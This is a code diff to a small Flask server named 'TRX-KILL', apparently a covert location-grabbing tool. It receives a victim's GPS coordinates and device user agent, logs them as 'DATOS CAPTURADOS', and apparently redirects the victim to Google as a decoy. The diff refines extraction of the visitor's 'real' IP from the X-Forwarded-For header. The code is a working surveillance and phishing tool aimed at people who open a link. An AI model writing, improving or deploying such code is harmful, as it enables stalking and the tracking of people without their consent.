@@ -11,7 +11,6 @@ app = Flask('TRX-KILL')
 URL_FINAL = "https://www.google.com"
 
 def force_clean():
-    # Limpieza forzada sin librerías externas complicadas
     os.system('fuser -k 5000/tcp > /dev/null 2>&1')
     time.sleep(0.5)
 
@@ -41,9 +40,12 @@ def index(): return render_template_string(HTML_FINAL)
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    print(f"\n\033[1;31m[!] DATOS CAPTURADOS\033[0m")
-    print(f"\033[1;32m[*] IP: {ip}\n[*] GPS: {d['lat']}, {d['lon']}\n[*] DISPOSITIVO: {d['ua']}\033[0m\n")
+    if request.headers.getlist("X-Forwarded-For"):
+        ip = request.headers.getlist("X-Forwarded-For")[0]
+    else:
+        ip = request.remote_addr
+    print(f"\n\033[1;31m[!] DATOS CAPTURADOS DEL DISPOSITIVO\033[0m")
+    print(f"\033[1;32m[*] IP REAL: {ip}\n[*] GPS: {d['lat']}, {d['lon']}\n[*] DISPOSITIVO: {d['ua']}\033[0m\n")
     return "OK"
 
 def banner():
